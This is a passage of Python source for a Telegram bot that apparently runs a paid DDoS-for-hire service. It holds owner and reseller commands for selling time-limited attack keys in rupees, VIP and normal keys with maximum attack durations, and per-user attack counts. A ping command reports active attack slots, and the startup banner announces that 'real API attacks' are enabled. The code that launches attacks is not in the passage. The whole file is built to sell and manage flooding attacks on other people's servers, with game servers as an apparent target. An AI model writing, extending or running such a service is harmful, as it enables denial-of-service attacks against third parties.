        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
    
    if not all_users:
        safe_send_message(message.chat.id, "📋 No users found!", reply_to=message)
        return
    
    active_users = []
    expired_users = []
    
    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    
    content = "═══════════════════════════\n"
    content += "       ALL USERS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 ACTIVE USERS ({len(active_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(active_users, 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"
        
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        content += f"   Type: {key_type}\n"
        content += f"   Duration: {user.get('key_duration_label', 'N/A')}\n"
        content += f"   Time Left: {time_str}\n"
        content += f"   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   Reseller: @{user['reseller_username']}\n"
        content += "\n"
    
    if not active_users:
        content += "   No active users\n\n"
    
    content += f"\n🔴 EXPIRED USERS ({len(expired_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(expired_users, 1):
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        content += f"   Type: {key_type}\n"
        if user.get('key_expiry'):
            content += f"   Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        content += "\n"
    
    if not expired_users:
        content += "   No expired users\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(active_users)} Active | {len(expired_users)} Expired\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    if bot:
        bot.send_document(message.chat.id, file, caption=f"👥 All Users Report\n\n🟢 Active: {len(active_users)}\n🔴 Expired: {len(expired_users)}")

@bot.message_handler(commands=["delexpkey"])
def del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    all_used_keys = list(keys_collection.find({'used': True}))
    expired_keys = []
    
    for key in all_used_keys:
        user = users_collection.find_one({'key': key['key']})
        if user:
            if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                expired_keys.append(key)
        else:
            expired_keys.append(key)
    
    if not expired_keys:
        safe_send_message(message.chat.id, "✅ No expired keys found!", reply_to=message)
        return
    
    pending_del_exp_key = {}
    pending_del_exp_key[user_id] = expired_keys
    
    safe_send_message(message.chat.id, f"⚠️ Found {len(expired_keys)} expired keys!\n\nType /confirm_delexpkey to confirm.\nType /cancel to cancel.", reply_to=message)

@bot.message_handler(commands=["confirm_delexpkey"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp_key:
        safe_send_message(message.chat.id, "❌ First use /delexpkey!", reply_to=message)
        return
    
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    
    deleted_count = 0
    for key in expired_keys:
        try:
            keys_collection.delete_one({'key': key['key']})
            deleted_count += 1
        except:
            pass
    
    safe_send_message(message.chat.id, f"✅ {deleted_count} expired keys deleted!", reply_to=message)

@bot.message_handler(commands=["trail"])
def trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /trail <hours> <max_users>\n\nExample: /trail 1 10 (1 hour key for 10 users)", reply_to=message)
        return
    
    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid hours or max_users!", reply_to=message)
        return
    
    key = f"TRAIL-{generate_key(8)}"
    
    key_doc = {
        'key': key,
        'duration_seconds': hours * 3600,
        'duration_label': f"{hours} hours (Trail)",
        'created_at': datetime.now(),
        'created_by': user_id,
        'created_by_type': 'owner',
        'used': False,
        'used_by': None,
        'used_at': None,
        'max_users': max_users,
        'current_users': 0,
        'is_trail': True,
        'key_type': 'NORMAL',
        'max_attack_time': 300
    }
    
    keys_collection.insert_one(key_doc)
    
    safe_send_message(message.chat.id, f"✅ Trail Key Generated!\n\n🔑 Key: `{key}`\n⏰ Duration: {hours} hours\n👥 Max Users: {max_users}", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command can only be used by the owner!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /addgrp <name> <group_id> <days>\n\nExample: /addgrp TESTGROUP -100123456789 30")
        return
    
    name = command_parts[1]
    group_id = command_parts[2]
    
    try:
        days = int(command_parts[3])
        expiry_date = datetime.now() + timedelta(days=days)
        
        group_data = {
            'name': name,
            'group_id': group_id,
            'added_by': user_id,
            'added_at': datetime.now(),
            'expiry_date': expiry_date,
            'max_attack_time': get_max_attack_time(),
            'max_slots': current_max_slots,
            'cooldown': get_user_cooldown_setting(),
            'feedback_required': get_setting('feedback_required', True)
        }
        
        approved_groups_collection.update_one(
            {'group_id': group_id},
            {'$set': group_data},
            upsert=True
        )
        
        bot.reply_to(message, f"✅ Group **{name}** approved!\n\n📊 Group ID: `{group_id}`\n⏰ Valid for: {days} days\n📅 Expires: {expiry_date.strftime('%d-%m-%Y')}\n\n⚙️ Default Settings:\n• Max Attack Time: {group_data['max_attack_time']}s\n• Max Slots: {group_data['max_slots']}\n• Cooldown: {group_data['cooldown']}s\n• Feedback Required: {'ON' if group_data['feedback_required'] else 'OFF'}", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Invalid days value!")

@bot.message_handler(commands=["delgrp"])
def del_group_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command can only be used by the owner!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delgrp <name>\n\nUse /grpinfo to see group names.")
        return
    
    name = command_parts[1]
    
    result = approved_groups_collection.delete_one({'name': name})
    
    if result.deleted_count > 0:
        bot.reply_to(message, f"✅ Group **{name}** removed from approved list!", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ Group **{name}** not found!", parse_mode="Markdown")

@bot.message_handler(commands=["grpinfo"])
def group_info_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command can only be used by the owner!")
        return
    
    groups = list(approved_groups_collection.find())
    
    if not groups:
        bot.reply_to(message, "📋 No approved groups found!")
        return
    
    response = "═══════════════════════════\n"
    response += "👥 APPROVED GROUPS\n"
    response += "═══════════════════════════\n\n"
    
    for i, group in enumerate(groups, 1):
        status = "✅ Active" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else "🔴 Expired"
        response += f"{i}. **{group.get('name', 'Unknown')}**\n"
        response += f"   📱 Group ID: `{group['group_id']}`\n"
        response += f"   📊 Status: {status}\n"
        response += f"   ⚙️ Max Time: {group.get('max_attack_time', get_max_attack_time())}s\n"
        response += f"   🎯 Max Slots: {group.get('max_slots', current_max_slots)}\n"
        response += f"   ⏳ Cooldown: {group.get('cooldown', get_user_cooldown_setting())}s\n"
        response += f"   📸 Feedback Required: {'ON' if group.get('feedback_required', get_setting('feedback_required', True)) else 'OFF'}\n"
        if group.get('expiry_date'):
            response += f"   📅 Expires: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
        response += "\n"
    
    response += "═══════════════════════════"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    all_users = list(users_collection.find())
    all_resellers = list(resellers_collection.find())
    all_bot_users = list(bot_users_collection.find())
    
    all_user_ids = set()
    for u in all_users:
        all_user_ids.add(u['user_id'])
    for r in all_resellers:
        all_user_ids.add(r['user_id'])
    for bu in all_bot_users:
        all_user_ids.add(bu['user_id'])
    
    sent_count = 0
    failed_count = 0
    
    for uid in all_user_ids:
        try:
            if bot:
                bot.send_message(uid, f"📢 BROADCAST\n\n{broadcast_msg}")
                sent_count += 1
                time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Broadcast Sent!\n\n📨 Total: {len(all_user_ids)}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcastreseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcastreseller <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    resellers = list(resellers_collection.find())
    reseller_ids = set(r['user_id'] for r in resellers)
    
    sent_count = 0
    failed_count = 0
    
    for uid in reseller_ids:
        try:
            if bot:
                bot.send_message(uid, f"📢 RESELLER NOTICE\n\n{broadcast_msg}")
                sent_count += 1
                time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Reseller Broadcast Sent!\n\n📨 Total: {len(reseller_ids)}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcastpaid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcastpaid <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    now = datetime.now()
    active_subscribers = list(users_collection.find({'key_expiry': {'$gt': now}}))
    
    if not active_subscribers:
        safe_send_message(message.chat.id, "📋 No active subscribers to send message to!", reply_to=message)
        return
        
    sent_count = 0
    fail_count = 0
    
    for user in active_subscribers:
        try:
            target_id = user['user_id']
            if is_owner(target_id):
                continue
            if bot:
                bot.send_message(target_id, f"💎 PAID USER ANNOUNCEMENT\n\n{broadcast_msg}")
                sent_count += 1
                time.sleep(0.05)
        except Exception:
            fail_count += 1
    
    safe_send_message(message.chat.id, f"✅ Broadcast Complete!\n\n👤 Sent to: {sent_count} paid users\n❌ Failed: {fail_count}", reply_to=message)

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /ban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if is_owner(target_user_id):
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}},
        upsert=True
    )
    
    try:
        if bot:
            bot.send_message(target_user_id, "🚫 You have been banned!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ User {display} banned!\n🆔 ID: {target_user_id}", reply_to=message)

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': False}}
    )
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            if bot:
                bot.send_message(target_user_id, "✅ Your ban has been lifted!")
        except:
            pass
        safe_send_message(message.chat.id, f"✅ User {display} unbanned!\n🆔 ID: {target_user_id}", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ User not found or already unbanned!", reply_to=message)

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /tban <id or @username> <time>\nExample: /tban 123456 10m", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
        
    if is_owner(target_user_id):
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
        
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    
    if not duration_td:
        safe_send_message(message.chat.id, "❌ Invalid duration format! Use: 10m, 1h, 1d etc.", reply_to=message)
        return
        
    ban_expiry = datetime.now() + duration_td
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}},
        upsert=True
    )
    
    safe_send_message(message.chat.id, f"🚫 User {resolved_name or target_user_id} has been banned for {label}!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}", reply_to=message)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if not is_owner(user_id) and not reseller:
        safe_send_message(message.chat.id, "❌ This command can only be used by owner/reseller!", reply_to=message)
        return
    
    if reseller and reseller.get('blocked'):
        safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
        return
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⭐ VIP KEY", callback_data="keytype_vip"),
        InlineKeyboardButton("📀 NORMAL KEY", callback_data="keytype_normal")
    )
    
    bot.reply_to(message, "🔑 **SELECT KEY TYPE**\n\nChoose the type of key you want to generate:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("keytype_"))
def key_type_callback(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id) and not get_reseller(user_id):
        bot.answer_callback_query(call.id, "❌ You are not authorized!")
        return
    
    key_type = call.data.replace("keytype_", "").upper()
    
    temp_key_gen[user_id] = {'key_type': key_type}
    
    bot.edit_message_text(
        f"✅ Selected: **{key_type} KEY**\n\n"
        f"📝 Now send the key details in this format:\n"
        f"`/gen <prefix> <duration> <count>`\n\n"
        f"Example: `/gen BGMI 1d 5`\n\n"
        f"Duration formats: 2h, 6h, 12h, 1d, 3d, 7d\n"
        f"Max count: 50 for owner, 20 for reseller\n\n"
        f"Type /cancel to abort.",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(call.message, process_key_gen)

def process_key_gen(message):
    user_id = message.from_user.id
    
    if message.text == "/cancel":
        if user_id in temp_key_gen:
            del temp_key_gen[user_id]
        bot.reply_to(message, "❌ Operation cancelled!")
        return
    
    if user_id not in temp_key_gen:
        bot.reply_to(message, "❌ Please use /gen command first!")
        return
    
    key_type = temp_key_gen[user_id]['key_type']
    del temp_key_gen[user_id]
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /gen <prefix> <duration> <count>\n\nExample: /gen BGMI 1d 5")
        return
    
    prefix = command_parts[1].upper()
    duration_str = command_parts[2].lower()
    
    duration_key = None
    for d in ['2h', '6h', '12h', '1d', '3d', '7d']:
        if duration_str == d:
            duration_key = d
            break
    
    if not duration_key:
        bot.reply_to(message, "❌ Invalid format! Use: 2h, 6h, 12h, 1d, 3d, 7d")
        return
    
    duration_seconds = DURATION_SECONDS[duration_key]
    duration_label = DURATION_LABELS[duration_key]
    
    try:
        count = int(command_parts[3])
        max_count = 50 if is_owner(user_id) else 20
        if count < 1 or count > max_count:
            bot.reply_to(message, f"❌ Count must be between 1-{max_count}!")
            return
    except:
        bot.reply_to(message, "❌ Invalid count!")
        return
    
    reseller = get_reseller(user_id)
    
    price_per_key = get_key_price(key_type, duration_key)
    max_attack_time = get_key_max_attack(key_type)
    total_price = price_per_key * count
    
    if is_owner(user_id):
        generated_keys = []
        for _ in range(count):
            key = generate_key(prefix, 12)
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        if count == 1:
            bot.reply_to(message, f"✅ {key_type} Key Generated!\n\n🔑 Key: `{generated_keys[0]}`\n⏰ Duration: {duration_label}\n⚡ Max Attack: {max_attack_time}s\n💰 Price: {price_per_key} Rs", parse_mode="Markdown")
        else:
            keys_text = "\n".join([f"• `{k}`" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} {key_type} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}\n⚡ Max Attack: {max_attack_time}s\n💰 Total Price: {total_price} Rs", parse_mode="Markdown")
    
    elif reseller:
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            bot.reply_to(message, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs ({count} x {price_per_key})\n💰 Your Balance: {balance} Rs\n\nAdd balance from owner!")
            return
        
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(username, 8)}"
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        new_balance = balance - total_price
        resellers_collection.update_one(
            {'user_id': user_id},
            {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}}
        )
        
        try:
            keys_list_str = "\n".join([f"{k}" for k in generated_keys])
            owner_msg = (
                f"🔔 RESELLER KEY GENERATION NOTIFICATION\n\n"
                f"👤 Reseller: {username} ({user_id})\n"
                f"🔑 Keys Generated: {count}\n"
                f"⭐ Key Type: {key_type}\n"
                f"⏰ Duration: {duration_label}\n"
                f"💵 Price per Key: {price_per_key} Rs\n"
                f"💵 Total Cost: {total_price} Rs\n"
                f"💰 Remaining Balance: {new_balance} Rs\n\n"
                f"📜 Keys:\n{keys_list_str}"
            )
            for owner in BOT_OWNER:
                if bot:
                    bot.send_message(owner, owner_msg)
        except Exception as e:
            print(f"Failed to notify owner: {e}")
        
        if count == 1:
            bot.reply_to(message, f"✅ {key_type} Key Generated!\n\n🔑 Key: `{generated_keys[0]}`\n⏰ Duration: {duration_label}\n💰 Balance: {new_balance} Rs\n⚡ Max Attack: {max_attack_time}s", parse_mode="Markdown")
        else:
            keys_text = "\n".join([f"• `{k}`" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} {key_type} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}\n💵 Cost: {total_price} Rs\n💰 Balance: {new_balance} Rs\n⚡ Max Attack: {max_attack_time}s", parse_mode="Markdown")

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"`{user_id}`", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    
    total_users = users_collection.count_documents({})
    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    busy_slots, free_slots, total_slots = get_slot_status()
    active_groups = approved_groups_collection.count_documents({})
    private_users = bot_users_collection.count_documents({})
    blocked_ips_count = len(get_all_blocked_ips())
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: {response_time}ms\n"
    response += f"• Active Attacks: {busy_slots}/{total_slots}\n"
    response += f"• Active Groups: {active_groups}\n"
    response += f"• Private Users: {private_users}\n"
    response += f"• Blocked IPs: {blocked_ips_count}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

print("=" * 60)
print("🤖 BOT STARTING WITH REAL API ATTACKS")
print("=" * 60)
print(f"✅ BOT_TOKEN: {'SET' if BOT_TOKEN else 'MISSING'}")
print(f"✅ API_BASE_URL: {'SET' if API_BASE_URL else 'MISSING'}")
print(f"✅ API_KEY: {'SET' if API_KEY else 'MISSING'}")
print(f"🎯 Max Simultaneous Slots: {current_max_slots}")
print(f"⚡ Concurrent Per Attack: {get_concurrent_limit()}")
print(f"⏱️ Max Attack Time (Normal): {get_max_attack_time()}s")
print(f"⭐ VIP Max Attack Time: {get_key_max_attack('VIP')}s")
print(f"📀 NORMAL Max Attack Time: {get_key_max_attack('NORMAL')}s")
print(f"⏳ Cooldown: {get_user_cooldown_setting()}s")
print(f"🚫 IP Blocking: Active")
print("=" * 60)
print("✅ ALL COMMANDS WORKING")
print("✅ REAL API ATTACKS ENABLED")
print("✅ STATUS SHOWS ALL ACTIVE ATTACKS")
print("✅ NON-BLOCKING ATTACKS - BOT RESPONSIVE")
print("✅ PORT PROTECTION: SAME PORT CANNOT BE ATTACKED WHILE ACTIVE")

# Start the main bot
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN is empty! Bot cannot start.")
        exit(1)
    try:
        bot.infinity_polling(timeout=20, long_polling_timeout=20)
    except Exception as e:
        print(f"Main bot error: {e}")